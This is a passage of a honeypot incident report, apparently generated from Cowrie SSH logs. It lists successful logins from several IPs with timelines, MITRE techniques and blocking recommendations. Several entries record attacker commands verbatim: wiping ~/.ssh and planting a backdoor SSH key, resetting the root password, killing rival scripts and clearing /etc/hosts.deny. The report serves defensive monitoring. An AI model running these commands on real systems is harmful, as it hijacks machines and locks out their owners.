| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:44:43` | `cowrie.session.connect` |
| `2026-04-05 20:44:43` | `cowrie.client.version` |
| `2026-04-05 20:44:43` | `cowrie.client.kex` |
| `2026-04-05 20:44:43` | `cowrie.login.success` |
| `2026-04-05 20:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf95f3add86

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:51 |
| **Last Seen** | 2026-04-05 20:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:51:32` | `cowrie.session.connect` |
| `2026-04-05 20:51:32` | `cowrie.client.version` |
| `2026-04-05 20:51:32` | `cowrie.client.kex` |
| `2026-04-05 20:51:33` | `cowrie.login.success` |
| `2026-04-05 20:51:33` | `cowrie.session.params` |
| `2026-04-05 20:51:33` | `cowrie.command.input` |
| `2026-04-05 20:51:33` | `cowrie.command.failed` |
| `2026-04-05 20:51:33` | `cowrie.log.closed` |
| `2026-04-05 20:51:33` | `cowrie.session.params` |
| `2026-04-05 20:51:33` | `cowrie.command.input` |
| `2026-04-05 20:51:33` | `cowrie.session.file_download` |
| `2026-04-05 20:51:33` | `cowrie.log.closed` |
| `2026-04-05 20:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fbe16ca9a09

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:51 |
| **Last Seen** | 2026-04-05 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:51:35` | `cowrie.session.connect` |
| `2026-04-05 20:51:35` | `cowrie.client.version` |
| `2026-04-05 20:51:35` | `cowrie.client.kex` |
| `2026-04-05 20:51:35` | `cowrie.login.success` |
| `2026-04-05 20:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2d735183c4

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:53 |
| **Last Seen** | 2026-04-05 20:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:53:50` | `cowrie.session.connect` |
| `2026-04-05 20:53:50` | `cowrie.client.version` |
| `2026-04-05 20:53:50` | `cowrie.client.kex` |
| `2026-04-05 20:53:50` | `cowrie.login.success` |
| `2026-04-05 20:53:51` | `cowrie.session.params` |
| `2026-04-05 20:53:51` | `cowrie.command.input` |
| `2026-04-05 20:53:51` | `cowrie.command.failed` |
| `2026-04-05 20:53:51` | `cowrie.log.closed` |
| `2026-04-05 20:53:51` | `cowrie.session.params` |
| `2026-04-05 20:53:51` | `cowrie.command.input` |
| `2026-04-05 20:53:51` | `cowrie.session.file_download` |
| `2026-04-05 20:53:51` | `cowrie.log.closed` |
| `2026-04-05 20:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e32d5d42e2e1

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:53 |
| **Last Seen** | 2026-04-05 20:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:53:53` | `cowrie.session.connect` |
| `2026-04-05 20:53:53` | `cowrie.client.version` |
| `2026-04-05 20:53:53` | `cowrie.client.kex` |
| `2026-04-05 20:53:53` | `cowrie.login.success` |
| `2026-04-05 20:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713485236fd4

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:56 |
| **Last Seen** | 2026-04-05 20:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:56:13` | `cowrie.session.connect` |
| `2026-04-05 20:56:13` | `cowrie.client.version` |
| `2026-04-05 20:56:13` | `cowrie.client.kex` |
| `2026-04-05 20:56:13` | `cowrie.login.success` |
| `2026-04-05 20:56:13` | `cowrie.session.params` |
| `2026-04-05 20:56:13` | `cowrie.command.input` |
| `2026-04-05 20:56:13` | `cowrie.command.failed` |
| `2026-04-05 20:56:13` | `cowrie.log.closed` |
| `2026-04-05 20:56:14` | `cowrie.session.params` |
| `2026-04-05 20:56:14` | `cowrie.command.input` |
| `2026-04-05 20:56:14` | `cowrie.session.file_download` |
| `2026-04-05 20:56:14` | `cowrie.log.closed` |
| `2026-04-05 20:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a63484f6b08

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:56 |
| **Last Seen** | 2026-04-05 20:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:56:15` | `cowrie.session.connect` |
| `2026-04-05 20:56:15` | `cowrie.client.version` |
| `2026-04-05 20:56:15` | `cowrie.client.kex` |
| `2026-04-05 20:56:15` | `cowrie.login.success` |
| `2026-04-05 20:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f93eb04ef9

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:58 |
| **Last Seen** | 2026-04-05 20:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:58:32` | `cowrie.session.connect` |
| `2026-04-05 20:58:32` | `cowrie.client.version` |
| `2026-04-05 20:58:32` | `cowrie.client.kex` |
| `2026-04-05 20:58:32` | `cowrie.login.success` |
| `2026-04-05 20:58:32` | `cowrie.session.params` |
| `2026-04-05 20:58:32` | `cowrie.command.input` |
| `2026-04-05 20:58:32` | `cowrie.command.failed` |
| `2026-04-05 20:58:32` | `cowrie.log.closed` |
| `2026-04-05 20:58:33` | `cowrie.session.params` |
| `2026-04-05 20:58:33` | `cowrie.command.input` |
| `2026-04-05 20:58:33` | `cowrie.session.file_download` |
| `2026-04-05 20:58:33` | `cowrie.log.closed` |
| `2026-04-05 20:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8098269fa302

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:58 |
| **Last Seen** | 2026-04-05 20:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:58:34` | `cowrie.session.connect` |
| `2026-04-05 20:58:34` | `cowrie.client.version` |
| `2026-04-05 20:58:34` | `cowrie.client.kex` |
| `2026-04-05 20:58:35` | `cowrie.login.success` |
| `2026-04-05 20:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d7a12aac51

| Field | Detail |
|---|---|
| **Source IP** | `112.118.57[.]75` |
| **First Seen** | 2026-04-05 21:33 |
| **Last Seen** | 2026-04-05 21:34 |
| **Session Duration** | 49s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 21:33:10` | `cowrie.session.connect` |
| `2026-04-05 21:33:10` | `cowrie.client.version` |
| `2026-04-05 21:33:10` | `cowrie.client.kex` |
| `2026-04-05 21:33:11` | `cowrie.login.failed` |
| `2026-04-05 21:33:12` | `cowrie.login.success` |
| `2026-04-05 21:33:12` | `cowrie.session.params` |
| `2026-04-05 21:33:12` | `cowrie.command.input` |
| `2026-04-05 21:33:12` | `cowrie.command.failed` |
| `2026-04-05 21:33:12` | `cowrie.log.closed` |
| `2026-04-05 21:33:13` | `cowrie.session.params` |
| `2026-04-05 21:33:13` | `cowrie.command.input` |
| `2026-04-05 21:33:13` | `cowrie.log.closed` |
| `2026-04-05 21:33:13` | `cowrie.session.params` |
| `2026-04-05 21:33:13` | `cowrie.command.input` |
| `2026-04-05 21:33:13` | `cowrie.log.closed` |
| `2026-04-05 21:33:14` | `cowrie.session.params` |
| `2026-04-05 21:33:14` | `cowrie.command.input` |
| `2026-04-05 21:33:14` | `cowrie.log.closed` |
| `2026-04-05 21:33:14` | `cowrie.session.params` |
| `2026-04-05 21:33:14` | `cowrie.command.input` |
| `2026-04-05 21:33:14` | `cowrie.log.closed` |
| `2026-04-05 21:33:15` | `cowrie.session.params` |
| `2026-04-05 21:33:15` | `cowrie.command.input` |
| `2026-04-05 21:33:15` | `cowrie.log.closed` |
| `2026-04-05 21:33:15` | `cowrie.session.params` |
| `2026-04-05 21:33:15` | `cowrie.command.input` |
| `2026-04-05 21:33:15` | `cowrie.log.closed` |
| `2026-04-05 21:33:16` | `cowrie.session.params` |
| `2026-04-05 21:33:16` | `cowrie.command.input` |
| `2026-04-05 21:33:16` | `cowrie.log.closed` |
| `2026-04-05 21:33:16` | `cowrie.session.params` |
| `2026-04-05 21:33:16` | `cowrie.command.input` |
| `2026-04-05 21:33:16` | `cowrie.log.closed` |
| `2026-04-05 21:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.118.57[.]75` to AbuseIPDB if not already reported
- [ ] Block `112.118.57[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7db7075a9d0

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]3` |
| **First Seen** | 2026-04-05 21:35 |
| **Last Seen** | 2026-04-05 21:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 21:35:10` | `cowrie.session.connect` |
| `2026-04-05 21:35:10` | `cowrie.client.version` |
| `2026-04-05 21:35:10` | `cowrie.client.kex` |
| `2026-04-05 21:35:10` | `cowrie.login.success` |
| `2026-04-05 21:35:10` | `cowrie.session.params` |
| `2026-04-05 21:35:10` | `cowrie.command.input` |
| `2026-04-05 21:35:10` | `cowrie.command.failed` |
| `2026-04-05 21:35:10` | `cowrie.log.closed` |
| `2026-04-05 21:35:11` | `cowrie.session.params` |
| `2026-04-05 21:35:11` | `cowrie.command.input` |
| `2026-04-05 21:35:11` | `cowrie.session.file_download` |
| `2026-04-05 21:35:11` | `cowrie.log.closed` |
| `2026-04-05 21:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]3` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf27cd978ac

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]3` |
| **First Seen** | 2026-04-05 21:35 |
| **Last Seen** | 2026-04-05 21:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 21:35:13` | `cowrie.session.connect` |
| `2026-04-05 21:35:13` | `cowrie.client.version` |
| `2026-04-05 21:35:13` | `cowrie.client.kex` |
| `2026-04-05 21:35:13` | `cowrie.login.success` |
| `2026-04-05 21:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]3` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af078d2c7afe

| Field | Detail |
|---|---|
| **Source IP** | `113.45.150[.]82` |
| **First Seen** | 2026-04-05 21:55 |
| **Last Seen** | 2026-04-05 21:55 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wOFZrZ4z1bqC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 21:55:22` | `cowrie.session.connect` |
| `2026-04-05 21:55:22` | `cowrie.client.version` |
| `2026-04-05 21:55:22` | `cowrie.client.kex` |
| `2026-04-05 21:55:23` | `cowrie.login.success` |
| `2026-04-05 21:55:23` | `cowrie.session.params` |
| `2026-04-05 21:55:23` | `cowrie.command.input` |
| `2026-04-05 21:55:23` | `cowrie.command.failed` |
| `2026-04-05 21:55:23` | `cowrie.log.closed` |
| `2026-04-05 21:55:24` | `cowrie.session.params` |
| `2026-04-05 21:55:24` | `cowrie.command.input` |
| `2026-04-05 21:55:24` | `cowrie.session.file_download` |
| `2026-04-05 21:55:24` | `cowrie.log.closed` |
| `2026-04-05 21:55:36` | `cowrie.session.params` |
| `2026-04-05 21:55:36` | `cowrie.command.input` |
| `2026-04-05 21:55:36` | `cowrie.log.closed` |
| `2026-04-05 21:55:36` | `cowrie.session.params` |
| `2026-04-05 21:55:36` | `cowrie.command.input` |
| `2026-04-05 21:55:36` | `cowrie.log.closed` |
| `2026-04-05 21:55:37` | `cowrie.session.params` |
| `2026-04-05 21:55:37` | `cowrie.command.input` |
| `2026-04-05 21:55:37` | `cowrie.session.file_download` |
| `2026-04-05 21:55:37` | `cowrie.log.closed` |
| `2026-04-05 21:55:37` | `cowrie.session.params` |
| `2026-04-05 21:55:37` | `cowrie.command.input` |
| `2026-04-05 21:55:37` | `cowrie.log.closed` |
| `2026-04-05 21:55:38` | `cowrie.session.params` |
| `2026-04-05 21:55:38` | `cowrie.command.input` |
| `2026-04-05 21:55:38` | `cowrie.log.closed` |
| `2026-04-05 21:55:38` | `cowrie.session.params` |
| `2026-04-05 21:55:38` | `cowrie.command.input` |
| `2026-04-05 21:55:38` | `cowrie.command.input` |
| `2026-04-05 21:55:38` | `cowrie.log.closed` |
| `2026-04-05 21:55:38` | `cowrie.session.params` |
| `2026-04-05 21:55:38` | `cowrie.command.input` |
| `2026-04-05 21:55:38` | `cowrie.log.closed` |
| `2026-04-05 21:55:39` | `cowrie.session.params` |
| `2026-04-05 21:55:39` | `cowrie.command.input` |
| `2026-04-05 21:55:39` | `cowrie.log.closed` |
| `2026-04-05 21:55:39` | `cowrie.session.params` |
| `2026-04-05 21:55:39` | `cowrie.command.input` |
| `2026-04-05 21:55:39` | `cowrie.log.closed` |
| `2026-04-05 21:55:39` | `cowrie.session.params` |
| `2026-04-05 21:55:39` | `cowrie.command.input` |
| `2026-04-05 21:55:40` | `cowrie.log.closed` |
| `2026-04-05 21:55:40` | `cowrie.session.params` |
| `2026-04-05 21:55:40` | `cowrie.command.input` |
| `2026-04-05 21:55:40` | `cowrie.log.closed` |
| `2026-04-05 21:55:40` | `cowrie.session.params` |
| `2026-04-05 21:55:40` | `cowrie.command.input` |
| `2026-04-05 21:55:40` | `cowrie.log.closed` |
| `2026-04-05 21:55:41` | `cowrie.session.params` |
| `2026-04-05 21:55:41` | `cowrie.command.input` |
| `2026-04-05 21:55:41` | `cowrie.log.closed` |
| `2026-04-05 21:55:41` | `cowrie.session.params` |
| `2026-04-05 21:55:41` | `cowrie.command.input` |
| `2026-04-05 21:55:41` | `cowrie.log.closed` |
| `2026-04-05 21:55:42` | `cowrie.session.params` |
| `2026-04-05 21:55:42` | `cowrie.command.input` |
| `2026-04-05 21:55:42` | `cowrie.log.closed` |
| `2026-04-05 21:55:42` | `cowrie.session.params` |
| `2026-04-05 21:55:42` | `cowrie.command.input` |
| `2026-04-05 21:55:42` | `cowrie.log.closed` |
| `2026-04-05 21:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.45.150[.]82` to AbuseIPDB if not already reported
- [ ] Block `113.45.150[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4a1f35d043

| Field | Detail |
|---|---|
| **Source IP** | `113.45.150[.]82` |
| **First Seen** | 2026-04-05 21:58 |
| **Last Seen** | 2026-04-05 21:58 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XT0bs4b7EMcY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 21:58:39` | `cowrie.session.connect` |
| `2026-04-05 21:58:39` | `cowrie.client.version` |
| `2026-04-05 21:58:39` | `cowrie.client.kex` |
| `2026-04-05 21:58:40` | `cowrie.login.success` |
| `2026-04-05 21:58:40` | `cowrie.session.params` |
| `2026-04-05 21:58:40` | `cowrie.command.input` |
| `2026-04-05 21:58:40` | `cowrie.command.failed` |
| `2026-04-05 21:58:40` | `cowrie.log.closed` |
| `2026-04-05 21:58:40` | `cowrie.session.params` |
| `2026-04-05 21:58:40` | `cowrie.command.input` |
| `2026-04-05 21:58:40` | `cowrie.session.file_download` |
| `2026-04-05 21:58:40` | `cowrie.log.closed` |
| `2026-04-05 21:58:53` | `cowrie.session.params` |
| `2026-04-05 21:58:53` | `cowrie.command.input` |
